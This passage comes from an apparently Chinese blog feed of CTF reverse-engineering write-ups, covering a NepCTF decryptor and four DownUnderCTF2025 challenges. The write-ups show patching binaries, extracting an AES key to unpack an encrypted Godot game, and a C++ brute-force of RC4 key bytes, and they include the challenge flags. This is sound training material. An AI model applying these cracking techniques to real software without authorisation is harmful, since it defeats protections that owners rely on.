class="number">6</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span> <span class="keyword">or</span> n % (i + <span class="number">2</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_next_prime</span>(<span class="params">index, byte_val</span>):</span><br><span class="line">    n = (index * <span class="number">384</span>) + byte_val</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(n) <span class="keyword">and</span> (n - <span class="number">1</span>) % <span class="number">5</span> != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dec1</span>():</span><br><span class="line">    primes = [<span class="number">359</span>, <span class="number">383</span>]</span><br><span class="line">    plaintext_bytes = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Enc)):</span><br><span class="line">        p = primes[i]</span><br><span class="line">        q = primes[i+<span class="number">1</span>]</span><br><span class="line">        c = Enc[i]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分别求解 x^5 ≡ c (mod p) 和 x^5 ≡ c (mod q)</span></span><br><span class="line">        d_p = <span class="built_in">pow</span>(<span class="number">5</span>, -<span class="number">1</span>, p - <span class="number">1</span>)</span><br><span class="line">        d_q = <span class="built_in">pow</span>(<span class="number">5</span>, -<span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">        x_p = <span class="built_in">pow</span>(c, d_p, p)</span><br><span class="line">        x_q = <span class="built_in">pow</span>(c, d_q, q)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 中国剩余定理合并解</span></span><br><span class="line">        inv_p_mod_q = <span class="built_in">pow</span>(p, -<span class="number">1</span>, q)</span><br><span class="line">        h = ((x_q - x_p) * inv_p_mod_q) % q</span><br><span class="line">        x = x_p + p * h</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算出明文字节</span></span><br><span class="line">        byte_val = x - <span class="number">64</span></span><br><span class="line">        plaintext_bytes.append(byte_val)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算下一个素数</span></span><br><span class="line">        next_prime = find_next_prime(i + <span class="number">1</span>, byte_val)</span><br><span class="line">        primes.append(next_prime)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ksa</span>(<span class="params">key: <span class="built_in">str</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    key_bytes = key.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    key_len = <span class="built_in">len</span>(key_bytes)</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + key_bytes[i % key_len]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dec2</span>(<span class="params">ciphertext: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key = <span class="string">&quot;Speedmino Created By MrZ and modified by zxc&quot;</span></span><br><span class="line">    </span><br><span class="line">    secret_box = ksa(key)</span><br><span class="line">    </span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    plaintext = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> byte_data <span class="keyword">in</span> ciphertext:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + secret_box[i]) % <span class="number">256</span></span><br><span class="line">        secret_box[i], secret_box[j] = secret_box[j], secret_box[i]</span><br><span class="line">        keystream_byte = secret_box[(secret_box[i] + secret_box[j]) % <span class="number">256</span>]</span><br><span class="line">        decrypted_byte = (byte_data - keystream_byte + <span class="number">256</span>) % <span class="number">256</span></span><br><span class="line">        plaintext.append(decrypted_byte)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encrypted_data = Dec1()</span><br><span class="line"></span><br><span class="line">    decrypted_bytes = Dec2(encrypted_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(decrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># NepCTF&#123;Y0u_c4n_M0dDing_LOVE2D_g@mE_By_l0vely_iNjector!&#125;</span></span><br></pre></td></tr></table></figure><p><strong>NepCTF{Y0u_c4n_M0dDing_LOVE2D_g@mE_By_l0vely_iNjector!}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NepCTF2025-WP&quot;&gt;&lt;a href=&quot;#NepCTF2025-WP&quot; class=&quot;headerlink&quot; title=&quot;NepCTF2025 WP&quot;&gt;&lt;/a&gt;NepCTF2025 WP&lt;/h1&gt;&lt;p&gt;这次逆向的题目质量都挺好的，各个考点都不错，拿下三个</summary>
      
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/categories/CTF%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>DownUnderCTF2025 WP</title>
    <link href="https://tkazer.github.io/2025/07/21/DownUnderCTF2025/"/>
    <id>https://tkazer.github.io/2025/07/21/DownUnderCTF2025/</id>
    <published>2025-07-21T07:20:15.000Z</published>
    <updated>2025-07-21T12:11:41.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DownUnderCTF-Reverse-WP"><a href="#DownUnderCTF-Reverse-WP" class="headerlink" title="DownUnderCTF Reverse WP"></a>DownUnderCTF Reverse WP</h1><p>这次比赛没有安卓，打的很开心（，给最后一题hard难度的swift逆向折磨到凌晨三点多才AK，总体难度还行，python那题比较有新意，Swift纯是语言本身拔高的难度。</p><h2 id="rocky"><a href="#rocky" class="headerlink" title="rocky"></a>rocky</h2><p>main函数将输入文本进行md5，然后与s1比对，若比对成功则解密文本输出。</p><p><img src="/2025/07/21/DownUnderCTF2025/image.png" alt="alt text"></p><p>直接网站碰撞md5，得到”emergencycall911”</p><p><img src="/2025/07/21/DownUnderCTF2025/image-1.png" alt="alt text"></p><p>运行输入即可得到Flag。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-2.png" alt="alt text"></p><p><strong>DUCTF{In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}</strong></p><h2 id="skippy"><a href="#skippy" class="headerlink" title="skippy"></a>skippy</h2><p>stone函数和decryptor函数存在无效指针读取操作。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-3.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-5.png" alt="alt text"></p><p>nop对应的两处汇编即可。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-4.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-6.png" alt="alt text"></p><p>运行，自解密得到Flag。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-7.png" alt="alt text"></p><p><strong>DUCTF{There_echoes_a_chorus_enending_and_wild_Laughter_and_gossip_unruly_and_piled}</strong></p><h2 id="godot"><a href="#godot" class="headerlink" title="godot"></a>godot</h2><p>直接拖入Godot RE Tools（GDRE）分析，发现无法解包，应该是pck被加密了。</p><p>IDA拖入程序分析，搜索encrypt，发现以下文本，应该是打开加密数据的一个Log文本。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-8.png" alt="alt text"></p><p>在他的交叉调用函数下面就可以找到Godot加密数据解密代码，byte_143F78540就是AES key，填入GDRE设置，再拖入程序即可解包。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-9.png" alt="alt text"></p><p>成功解包。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-10.png" alt="alt text"></p><p>发现素材中有个没有在游戏中出现过的角色。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-11.png" alt="alt text"></p><p>且可以看到是在godot_sprite引入了这张素材。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-12.png" alt="alt text"></p><p>在src&#x2F;shop.gd代码中可以看到这边引入了godotSprite，且在帧函数实时判断当前时间是否等于程序初始化时间-1天，然后显示godotSprite角色。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-13.png" alt="alt text"></p><p>运行游戏，将电脑设置日期往前一天，分钟也往前一分钟，等一会到时间，这边就会刷新出这个角色，但似乎无法交互。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-14.png" alt="alt text"></p><p>地图有向上的闯关，猜测在上面有其他东西，这边直接用CE将Y坐标改到-1000，飞到上面发现上面有另一个商店和角色，可交互。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-16.png" alt="alt text"></p><p>和这个角色对话完，再回到下面的商店，在红色角色附近点下E就会被传送到背景墙由Flag构成的地图。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-15.png" alt="alt text"></p><p><strong>DUCTF{THE_BOY_WILL_NEVER_REMEMBER}</strong></p><h2 id="bilingual"><a href="#bilingual" class="headerlink" title="bilingual"></a>bilingual</h2><p>python代码从DATA加载了一段Base64后的文件，解密输出到”hello.bin”，然后要求输入password，初步判断长度是否为12，通过调用hello.bin的四个Check函数校验password，校验成功则使用password进行Flag解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">DATA=<span class="string">&quot;...&quot;</span></span><br><span class="line"><span class="keyword">import</span> argparse,base64,ctypes,zlib,pathlib,sys</span><br><span class="line">PASSWORD=<span class="string">&#x27;cheese&#x27;</span></span><br><span class="line">FLAG=<span class="string">&#x27;jqsD0um75+TyJR3z0GbHwBQ+PLIdSJ+rojVscEL4IYkCOZ6+a5H1duhcq+Ub9Oa+ZWKuL703&#x27;</span></span><br><span class="line">KEY=<span class="string">&#x27;68592cb91784620be98eca41f825260c&#x27;</span></span><br><span class="line">HELPER=<span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">password</span>):A=<span class="string">&#x27;utf-8&#x27;</span>;flag=<span class="built_in">bytearray</span>(base64.b64decode(FLAG));buffer=(ctypes.c_byte*<span class="built_in">len</span>(flag)).from_buffer(flag);key=ctypes.create_string_buffer(password.encode(A));result=get_helper().Decrypt(key,<span class="built_in">len</span>(key)-<span class="number">1</span>,buffer,<span class="built_in">len</span>(buffer));<span class="keyword">return</span> flag.decode(A)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_helper</span>():</span><br><span class="line"><span class="keyword">global</span> HELPER</span><br><span class="line"><span class="keyword">if</span> HELPER:<span class="keyword">return</span> HELPER</span><br><span class="line">data=<span class="built_in">globals</span>().get(<span class="string">&#x27;DATA&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> data:</span><br><span class="line">dll_path=pathlib.Path(__file__).parent/<span class="string">&#x27;hello.bin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> dll_path.is_file():</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(dll_path,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> dll_file:dll_file.write(zlib.decompress(base64.b64decode(data)))</span><br><span class="line">HELPER=ctypes.cdll.LoadLibrary(dll_path)</span><br><span class="line"><span class="keyword">else</span>:<span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> HELPER</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_three</span>(<span class="params">password</span>):<span class="keyword">return</span> check_ex(password,<span class="string">&#x27;Check3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_four</span>(<span class="params">password</span>):<span class="keyword">return</span> check_ex(password,<span class="string">&#x27;Check4&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ex</span>(<span class="params">password,func</span>):</span><br><span class="line">GetIntCallbackFn=ctypes.CFUNCTYPE(ctypes.c_int,ctypes.c_wchar_p)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CallbackTable</span>(ctypes.Structure):_fields_=[(<span class="string">&#x27;E&#x27;</span>,GetIntCallbackFn)]</span><br><span class="line"><span class="meta">@GetIntCallbackFn</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_int</span>(<span class="params">v</span>):<span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">eval</span>(v))</span><br><span class="line">table=CallbackTable(E=eval_int);helper=get_helper();helper[func].argtypes=[ctypes.POINTER(CallbackTable)];helper[func].restype=ctypes.c_int;<span class="keyword">return</span> helper[func](ctypes.byref(table))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_two</span>(<span class="params">password</span>):</span><br><span class="line"><span class="meta">@ctypes.CFUNCTYPE(<span class="params">ctypes.c_int,ctypes.c_int</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">i</span>):<span class="keyword">return</span> <span class="built_in">ord</span>(password[i-<span class="number">3</span>])+<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_helper().Check2(callback)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_one</span>(<span class="params">password</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(password)!=<span class="number">12</span>:<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">return</span> get_helper().Check1(password)!=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_password</span>(<span class="params">password</span>):</span><br><span class="line"><span class="keyword">global</span> PASSWORD;PASSWORD=password;checks=[check_one,check_two,check_three,check_four];result=<span class="literal">True</span></span><br><span class="line"><span class="keyword">for</span> check <span class="keyword">in</span> checks:result=result <span class="keyword">and</span> check(password)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">parser=argparse.ArgumentParser(description=<span class="string">&#x27;CTF Challenge&#x27;</span>);parser.add_argument(<span class="string">&#x27;password&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;Enter the password&#x27;</span>);args=parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> check_password(args.password):flag=decrypt_flag(args.password);<span class="built_in">print</span>(<span class="string">&#x27;Correct! The flag is DUCTF&#123;%s&#125;&#x27;</span>%flag);<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&#x27;That is not correct&#x27;</span>);<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:sys.exit(main())</span><br></pre></td></tr></table></figure><p>直接改代码在main最开始调用get_helper，得到hello.bin文件，进行IDA分析，动调设置这样就可以调试python的代码调用。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-18.png" alt="alt text"></p><p>Check1很简单，就是取第一个字节，判断xor 0x43是否等于11，那么就可以得到第一个字符是11^0x43&#x3D;0x48，’H’。</p><p>目前输入：</p><blockquote><p>H234567890ab</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-20.png" alt="alt text"></p><p>Check2这边一个callback是返回password[i-3]+3，ida那边的Check2实现也能看到调用了a1传进的函数回调，那么就可以通过这边是判断式子计算出两个字节，p[5]&#x3D;’p’，p[6]&#x3D;’h’。</p><p>目前输入：</p><blockquote><p>H2345ph890ab</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-21.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-22.png" alt="alt text"></p><p>Check3，这边先从Python那边获取到输入的password，以word储存。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-23.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-24.png" alt="alt text"></p><p>下面这边生成几个条件语句，要特别注意第二个and后面那个减数是%c不是%d，所以98 - 5的5是’5’，也就是p[4]字节。</p><p>从数据可以总结以下条件：</p><blockquote><p>p[8] + 2 &#x3D;&#x3D; p[11] &amp; p[7] &#x3D;&#x3D; p[8] &amp; (p[11] - (p[4] - ‘0’)) &#x3D;&#x3D; p[11]</p></blockquote><blockquote><p>p[7]&gt;’0’ &amp; p[7]&lt;’9’</p></blockquote><p>所以p[4]&#x3D;’0’，p[7]&#x3D;&#x3D;p[8]&#x3D;&#x3D;p[11]-2，p[7] p[8]都在’0’到’9’范围内。</p><p>目前输入（p[7] p[8] p[11]随便取一组符合条件的先）：</p><blockquote><p>H2340ph110a3</p></blockquote><p><img src="/2025/07/21/DownUnderCTF2025/image-25.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-26.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-27.png" alt="alt text"></p><p>Check4比较复杂，这个函数参数1传入密文，参数2是密文长度，参数3是解密返回数据，参数4是密钥，参数5是密钥长度，参数6是判断数值。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-28.png" alt="alt text"></p><p>传入先使用传入密钥进行rc4解密密文，然后进行hash，最后判断是否等于参数6的hash值。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-29.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-30.png" alt="alt text"></p><p>由于第一个hash判断只用密钥前2字节，这两个字节也是Check1和Check2通过输入字节计算出来的，只要过了这两个Check，那么这两个字节就会是正确的，也就能通过这个hash校验。</p><p>第一个解密出的文本：</p><p><img src="/2025/07/21/DownUnderCTF2025/image-31.png" alt="alt text"></p><p>第二个校验密钥长度是8，下标3、4、5、6都分别赋值了，下标2和7为默认的0xCC，这边赋值是通过p[1] p[2] p[3]三个未知字节进行计算，由于是未知的，就只能爆破，三字节爆破最后hash值为0x69FA99D。</p><p><img src="/2025/07/21/DownUnderCTF2025/image-32.png" alt="alt text"></p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">swap</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a, <span class="type">unsigned</span> <span class="type">char</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_sbox</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        sbox[i] = i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> keyLen = <span class="built_in">strlen</span>((<span class="type">char</span> *)key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Ttable[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        Ttable[i] = key[i % keyLen];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + sbox[i] + Ttable[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> data[], <span class="type">unsigned</span> <span class="type">char</span> key[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k, i = <span class="number">0</span>, j = <span class="number">0</span>, t;</span><br><span class="line">    <span class="built_in">init_sbox</span>(key);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dataLen = <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> h = <span class="number">0</span>; h &lt; dataLen; h++)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j = (j + sbox[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="built_in">swap</span>(sbox + i, sbox + j);</span><br><span class="line">        t = (sbox[i] + sbox[j]) % <span class="number">256</span>;</span><br><span class="line">        k = sbox[t];</span><br><span class="line">        data[h] ^= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF9EFF01630</span><span class="params">(<span class="type">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result&#123;&#125;; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v3&#123;&#125;;         <span class="comment">// r8d</span></span><br><span class="line">    <span class="type">char</span> *v4&#123;&#125;;       <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> *i&#123;&#125;;        <span class="comment">// rdx</span></span><br><span class="line">    __int64 v6&#123;&#125;;     <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">    v4 = &amp;a1[<span class="number">2</span> * a2];</span><br><span class="line">    <span class="keyword">for</span> (i = a1; *(WORD *)i; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= v4)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = <span class="number">2</span> * ((i - a1) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (result = <span class="number">5381</span>; v6; --v6)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *a1++;</span><br><span class="line">        result = v3 ^ (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">33</span> * result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key[<span class="number">9</span>] = &#123;</span><br><span class="line">        <span class="number">0x7A</span>, <span class="number">0x6D</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">0xffffff</span>; c++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> data2[<span class="number">32</span>] = &#123;</span><br><span class="line">            <span class="number">0xD0</span>, <span class="number">0xE9</span>, <span class="number">0xC1</span>, <span class="number">0x5A</span>, <span class="number">0x9E</span>, <span class="number">0x0C</span>, <span class="number">0x28</span>, <span class="number">0x31</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x5D</span>, <span class="number">0x68</span>, <span class="number">0x54</span>, <span class="number">0x8D</span>, <span class="number">0x6F</span>, <span class="number">0xE7</span>,</span><br><span class="line">            <span class="number">0xF6</span>, <span class="number">0xDB</span>, <span class="number">0xD7</span>, <span class="number">0xE5</span>, <span class="number">0xC0</span>, <span class="number">0x4B</span>, <span class="number">0x28</span>, <span class="number">0x46</span>, <span class="number">0xE7</span>, <span class="number">0xA4</span>, <span class="number">0x7E</span>, <span class="number">0xCD</span>, <span class="number">0x07</span>, <span class="number">0xF8</span>, <span class="number">0xF4</span>, <span class="number">0x41</span>&#125;;</span><br><span class="line">        key[<span class="number">4</span>] = c &amp; <span class="number">0xff</span>;</span><br><span class="line">        key[<span class="number">5</span>] = (c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        key[<span class="number">3</span>] = (<span class="number">0x1ACB</span> &gt;&gt; <span class="number">3</span>) ^ <span class="number">0x36</span>;</span><br><span class="line">        key[<span class="number">6</span>] = (c &amp; <span class="number">0xff</span>) ^ ((c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>) ^ ((c &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>) ^ <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RC4</span>(data2, key);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> result = <span class="built_in">sub_7FF9EFF01630</span>((<span class="type">char</span> *)data2, <span class="number">32</span> &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="number">0x69FA99D</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c\n&quot;</span>, c &amp; <span class="number">0xff</span>, (c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (c &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ydr</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 